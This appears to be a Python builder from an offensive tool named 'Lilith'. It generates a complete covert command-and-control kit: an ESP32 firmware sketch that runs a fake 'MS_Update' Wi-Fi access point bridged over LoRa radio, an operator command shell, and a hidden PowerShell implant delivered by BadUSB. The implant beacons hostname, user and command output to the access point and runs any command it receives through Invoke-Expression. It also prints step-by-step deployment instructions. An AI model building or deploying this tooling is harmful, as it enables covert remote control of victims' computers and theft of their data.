"""
Lilith — LoRa C2 relay builder (T-Embed Plus / ESP32 + SX1276)

Architecture:
  Target PC       ←USB HID→  T-Embed Plus       ←LoRa 915 MHz→  Operator receiver
  (lora_implant.ps1          (teembed_relay.ino:                  (2nd T-Embed or
   beacons via HTTP           WiFi AP 192.168.4.1                  ESP32+SX1276)
   to AP 192.168.4.1)         + LoRa bridge)                       ↓ USB serial ↓
                                                                 lora_listener.py

Files generated:
  teembed_relay/teembed_relay.ino  — flash to T-Embed Plus (WiFi AP + LoRa relay)
  lora_listener.py                 — operator-side serial reader + command shell
  lora_implant.ps1                 — PS1 beacon loop (plant via BadUSB stager or manually)

Flow:
  1. BadUSB (lilith build --usb … --usb-device teembed) delivers PS stager
  2. PS stager executes Lilith C2 agent (primary HTTPS channel)
  3. lora_implant.ps1 runs in a parallel runspace as the secondary out-of-band channel:
       target → WiFi → T-Embed AP → LoRa → operator receiver → lora_listener.py
  4. Operator types commands in lora_listener.py; T-Embed queues them for next beacon
"""

import os

# ── T-Embed Plus SX1276 SPI pins (LilyGo T-Embed Plus board) ─────────────────
_LORA_SCK   = 5
_LORA_MISO  = 3
_LORA_MOSI  = 6
_LORA_CS    = 7
_LORA_RST   = 8
_LORA_DIO0  = 33

_DEFAULT_SSID   = "MS_Update"
_DEFAULT_PASS   = "Upd@te2024!"
_DEFAULT_FREQ   = 915.0          # MHz — 915 for BR/US; 868 for EU
_DEFAULT_SERIAL = "/dev/ttyUSB0"
_DEFAULT_BAUD   = 115200


# ── generators ────────────────────────────────────────────────────────────────

def _teembed_relay_sketch(ssid: str, password: str, freq_mhz: float) -> str:
    """ESP32-S3 Arduino sketch: WiFi AP + HTTP server + LoRa relay for T-Embed Plus."""
    freq_hz = int(freq_mhz * 1e6)
    # Written as a raw-string template with placeholder substitution to avoid
    # escaping every C++ brace as {{ }} in an f-string.
    sketch = (
        r"""// Lilith LoRa C2 Relay — T-Embed Plus (ESP32-S3 + SX1276)
// Flash via Arduino IDE
//   Board  : LilyGo T-Embed (ESP32-S3)  — install via Board Manager URL:
//            https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json
//   Libs   : "LoRa" by Sandeep Mistry  (Sketch → Manage Libraries → search LoRa)
//            WebServer is bundled with ESP32 Arduino core
//   Upload : Tools → Partition Scheme → Default 4MB with spiffs → Upload
//
// After flashing:
//   T-Embed broadcasts AP  SSID_PLACEHOLDER  and bridges WiFi beacons to LoRa.
//   Open Serial Monitor @ 115200 to see status.

#include <WiFi.h>
#include <WebServer.h>
#include <SPI.h>
#include <LoRa.h>

const char*  AP_SSID  = "SSID_PLACEHOLDER";
const char*  AP_PASS  = "PASS_PLACEHOLDER";
const long   LORA_FREQ = FREQ_PLACEHOLDER;

#define LORA_SCK   SCK_PLACEHOLDER
#define LORA_MISO  MISO_PLACEHOLDER
#define LORA_MOSI  MOSI_PLACEHOLDER
#define LORA_CS    CS_PLACEHOLDER
#define LORA_RST   RST_PLACEHOLDER
#define LORA_DIO0  DIO0_PLACEHOLDER

WebServer server(80);
String pendingCmd = "";

void handleBeacon() {
  String body = server.arg("plain");
  // Forward beacon payload to operator over LoRa  (format: B:<body>)
  LoRa.beginPacket();
  LoRa.print("B:" + body);
  LoRa.endPacket();
  // Return any queued operator command and clear it
  server.send(200, "text/plain", pendingCmd);
  pendingCmd = "";
}

void setup() {
  Serial.begin(115200);

  // ── LoRa init ───────────────────────────────────────────────────────────────
  SPI.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_CS);
  LoRa.setPins(LORA_CS, LORA_RST, LORA_DIO0);
  if (!LoRa.begin(LORA_FREQ)) {
    Serial.println("[!] LoRa init failed — check wiring");
    while (1);
  }
  LoRa.setSpreadingFactor(7);      // SF7 = fastest, shortest range
  LoRa.setSignalBandwidth(125E3);
  LoRa.setCodingRate4(5);
  LoRa.setTxPower(20);
  Serial.println("[+] LoRa ready");

  // ── WiFi AP ─────────────────────────────────────────────────────────────────
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(
    IPAddress(192, 168, 4, 1),
    IPAddress(192, 168, 4, 1),
    IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID, AP_PASS);
  Serial.print("[+] AP '");
  Serial.print(AP_SSID);
  Serial.print("'  IP: ");
  Serial.println(WiFi.softAPIP());

  // ── HTTP routes ─────────────────────────────────────────────────────────────
  server.on("/beacon", HTTP_POST, handleBeacon);
  server.on("/", HTTP_GET, []() { server.send(200, "text/plain", "OK"); });
  server.begin();
  Serial.println("[+] HTTP server on :80");
}

void loop() {
  server.handleClient();

  // Poll LoRa for operator commands  (format: C:<command>)
  int pkt = LoRa.parsePacket();
  if (pkt) {
    String msg = "";
    while (LoRa.available()) msg += (char)LoRa.read();
    if (msg.startsWith("C:")) {
      pendingCmd = msg.substring(2);
      Serial.print("[cmd] ");
      Serial.println(pendingCmd);
    }
  }
}
"""
    )
    return (sketch
            .replace("SSID_PLACEHOLDER",  ssid)
            .replace("PASS_PLACEHOLDER",  password)
            .replace("FREQ_PLACEHOLDER",  str(freq_hz))
            .replace("SCK_PLACEHOLDER",   str(_LORA_SCK))
            .replace("MISO_PLACEHOLDER",  str(_LORA_MISO))
            .replace("MOSI_PLACEHOLDER",  str(_LORA_MOSI))
            .replace("CS_PLACEHOLDER",    str(_LORA_CS))
            .replace("RST_PLACEHOLDER",   str(_LORA_RST))
            .replace("DIO0_PLACEHOLDER",  str(_LORA_DIO0)))


def _lora_listener_script(serial_port: str, baud: int, freq_mhz: float) -> str:
    """Operator-side Python CLI: reads LoRa beacons, sends commands to T-Embed relay."""
    # Config block uses f-string for the variable parts.
    # The rest is written as plain string concatenation so the inner Python f-strings
    # ({args.port}, {p['host']}, etc.) are written literally — not interpolated here.
    config = (
        "#!/usr/bin/env python3\n"
        f"# Lilith LoRa C2 Listener  |  {freq_mhz} MHz  |  pip install pyserial\n"
        "# Usage: python lora_listener.py [--port PORT] [--baud BAUD]\n"
        "#\n"
        "# The LoRa receiver (second T-Embed / ESP32+SX1276) must be flashed with\n"
        "# teembed_relay.ino and connected via USB serial to this machine.\n\n"
        "import argparse, base64, sys, threading, time\n"
        "try:\n"
        "    import serial\n"
        "except ImportError:\n"
        "    sys.exit('pip install pyserial')\n\n"
        f'DEFAULT_PORT = "{serial_port}"\n'
        f"DEFAULT_BAUD = {baud}\n\n"
    )

    body = (
        "def _parse(raw):\n"
        "    if not raw.startswith('B:'): return {}\n"
        "    parts = raw[2:].strip().split('|', 2)\n"
        "    if len(parts) < 3: return {'raw': raw[2:]}\n"
        "    h, u, b = parts\n"
        "    try: out = base64.b64decode(b).decode('utf-8', errors='replace')\n"
        "    except Exception: out = b\n"
        "    return {'host': h, 'user': u, 'out': out}\n\n"

        "def _reader(ser, stop):\n"
        "    buf = ''\n"
        "    while not stop.is_set():\n"
        "        try: chunk = ser.read(ser.in_waiting or 1).decode('utf-8', errors='replace')\n"
        "        except serial.SerialException: break\n"
        "        buf += chunk\n"
        "        while '\\n' in buf:\n"
        "            line, buf = buf.split('\\n', 1)\n"
        "            line = line.strip()\n"
        "            if not line: continue\n"
        "            p = _parse(line)\n"
        "            if p.get('host'):\n"
        "                print(f\"\\n[beacon] {p['host']}\\\\{p['user']}\")\n"
        "                if p['out']: print(f\"[output]\\n{p['out']}\")\n"
        "            else:\n"
        "                print(f'[lora] {line}')\n"
        "        time.sleep(0.05)\n\n"

        "def main():\n"
        "    ap = argparse.ArgumentParser(description='Lilith LoRa C2 listener')\n"
        "    ap.add_argument('--port', default=DEFAULT_PORT, help='Serial port of LoRa receiver')\n"
        "    ap.add_argument('--baud', type=int, default=DEFAULT_BAUD)\n"
        "    args = ap.parse_args()\n"
        "    try:\n"
        "        ser = serial.Serial(args.port, args.baud, timeout=1)\n"
        "    except serial.SerialException as e:\n"
        "        sys.exit(f'[!] {e}')\n"
        "    print(f'[+] {args.port} @ {args.baud} baud  |  Ctrl+C to quit\\n')\n"
        "    stop = threading.Event()\n"
        "    threading.Thread(target=_reader, args=(ser, stop), daemon=True).start()\n"
        "    try:\n"
        "        while True:\n"
        "            cmd = input('cmd> ').strip()\n"
        "            if cmd:\n"
        "                ser.write(f'C:{cmd}\\n'.encode())\n"
        "                print(f'[*] sent → {cmd}')\n"
        "    except (KeyboardInterrupt, EOFError): pass\n"
        "    finally:\n"
        "        stop.set()\n"
        "        ser.close()\n"
        "        print('\\n[*] Bye.')\n\n"

        "if __name__ == '__main__':\n"
        "    main()\n"
    )

    return config + body


def _lora_implant_ps1(ssid: str, password: str) -> str:
    """PowerShell implant: connects to T-Embed AP and beacons every 30s via HTTP."""
    # PLACEHOLDER substitution avoids f-string conflicts with PS1's $ sigil.
    tmpl = r"""# Lilith LoRa C2 implant — secondary out-of-band beacon via T-Embed Plus
# Primary C2 (HTTPS) runs separately; this is the LoRa fallback / persistence channel.
#
# Requirements:
#   - T-Embed Plus flashed with teembed_relay.ino must be physically near target
#   - Target WiFi adapter must be able to reach the AP (AP range ~50m indoors)
#
# Usage (embedded in BadUSB stager or run manually):
#   powershell -ep bypass -WindowStyle Hidden -File lora_implant.ps1

$LoraSSID = 'SSID_PLACEHOLDER'
$LoraPass = 'PASS_PLACEHOLDER'
$LoraC2   = 'http://192.168.4.1/beacon'
$Interval = 30   # beacon interval in seconds

# ── Create WiFi profile and connect to T-Embed AP ──────────────────────────
$WlanXml = @"
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
  <name>$LoraSSID</name>
  <SSIDConfig><SSID><name>$LoraSSID</name></SSID></SSIDConfig>
  <connectionType>ESS</connectionType>
  <connectionMode>manual</connectionMode>
  <MSM>
    <security>
      <authEncryption>
        <authentication>WPA2PSK</authentication>
        <encryption>AES</encryption>
      </authEncryption>
      <sharedKey>
        <keyType>passPhrase</keyType>
        <protected>false</protected>
        <keyMaterial>$LoraPass</keyMaterial>
      </sharedKey>
    </security>
  </MSM>
</WLANProfile>
"@

$TmpXml = "$env:TEMP\lp.xml"
$WlanXml | Out-File -FilePath $TmpXml -Encoding UTF8 -Force
netsh wlan add profile filename="$TmpXml" 2>$null | Out-Null
Remove-Item $TmpXml -Force -EA SilentlyContinue
netsh wlan connect name="$LoraSSID" 2>$null | Out-Null
Start-Sleep 5

# ── Beacon loop in a detached runspace (non-blocking) ──────────────────────
$Rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
$Rs.Open()
$Rs.SessionStateProxy.SetVariable('C2',       $LoraC2)
$Rs.SessionStateProxy.SetVariable('Interval', $Interval)

$Ps = [System.Management.Automation.PowerShell]::Create()
$Ps.Runspace = $Rs
$null = $Ps.AddScript({
    $lastOut = 'online'
    while ($true) {
        $b64 = [Convert]::ToBase64String(
                   [System.Text.Encoding]::UTF8.GetBytes($lastOut))
        $body = "$env:COMPUTERNAME|$env:USERNAME|$b64"
        try {
            $resp = (Invoke-WebRequest -Uri $C2 -Method POST -Body $body `
                     -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop).Content.Trim()
        } catch { $resp = '' }
        if ($resp -and $resp -ne '') {
            $lastOut = try {
                Invoke-Expression $resp 2>&1 | Out-String
            } catch { "ERR: $_" }
        } else {
            $lastOut = ''
        }
        Start-Sleep $Interval
    }
})
$null = $Ps.BeginInvoke()
# Script exits immediately; runspace keeps the beacon loop alive in background.
"""
    return tmpl.replace("SSID_PLACEHOLDER", ssid).replace("PASS_PLACEHOLDER", password)


# ── public API ────────────────────────────────────────────────────────────────

def build_lora_payload(
    output_dir:  str,
    ssid:        str   = _DEFAULT_SSID,
    password:    str   = _DEFAULT_PASS,
    freq_mhz:    float = _DEFAULT_FREQ,
    serial_port: str   = _DEFAULT_SERIAL,
    baud:        int   = _DEFAULT_BAUD,
) -> bool:
    """Generate LoRa C2 relay kit for T-Embed Plus.

    output_dir  : directory to write generated files into
    ssid        : WiFi AP SSID broadcast by T-Embed (implant connects to this)
    password    : WPA2 password for T-Embed AP
    freq_mhz    : LoRa frequency — 915.0 for BR/US, 868.0 for EU
    serial_port : operator receiver serial port used by lora_listener.py
    baud        : serial baud rate
    """
    os.makedirs(output_dir, exist_ok=True)
    sketch_dir = os.path.join(output_dir, "teembed_relay")
    os.makedirs(sketch_dir, exist_ok=True)

    files = {
        os.path.join(sketch_dir, "teembed_relay.ino"): _teembed_relay_sketch(ssid, password, freq_mhz),
        os.path.join(output_dir, "lora_listener.py"):  _lora_listener_script(serial_port, baud, freq_mhz),
        os.path.join(output_dir, "lora_implant.ps1"):  _lora_implant_ps1(ssid, password),
    }

    for path, content in files.items():
        with open(path, "w") as fh:
            fh.write(content)
        rel = os.path.relpath(path, output_dir)
        print(f"[+] {rel:<48} → {path}")

    print(f"""
[*] LoRa C2 deployment guide
    ┌─ T-Embed Plus (relay — near target) ──────────────────────────────────
    │  1. Arduino IDE → open teembed_relay/teembed_relay.ino
    │  2. Board: LilyGo T-Embed (ESP32-S3)  |  Baud: 115200
    │  3. Flash → T-Embed broadcasts '{ssid}' AP and relays over LoRa @ {freq_mhz} MHz
    │
    ├─ Operator receiver (your machine) ────────────────────────────────────
    │  1. Flash teembed_relay.ino to a SECOND T-Embed or bare ESP32+SX1276
    │     connected via USB to your laptop  ({serial_port})
    │  2. pip install pyserial
    │  3. python lora_listener.py --port {serial_port}
    │     → type commands at 'cmd>' prompt, beacons appear automatically
    │
    └─ Target implant ──────────────────────────────────────────────────────
       Option A — embed in BadUSB stager (recommended):
         lilith build --usb <TOOL> --usb-device teembed
         then append:  & IEX (Get-Content lora_implant.ps1 -Raw)
       Option B — drop & run manually:
         powershell -ep bypass -WindowStyle Hidden -File lora_implant.ps1

[*] LoRa: {freq_mhz} MHz  (BR/US=915 | EU=868)  SF7  BW125  TxPower=20dBm
[*] AP credentials: '{ssid}' / '{password}'
[*] Beacon interval: 30s  |  Beacon format: hostname|user|base64(output)
""")
    return True
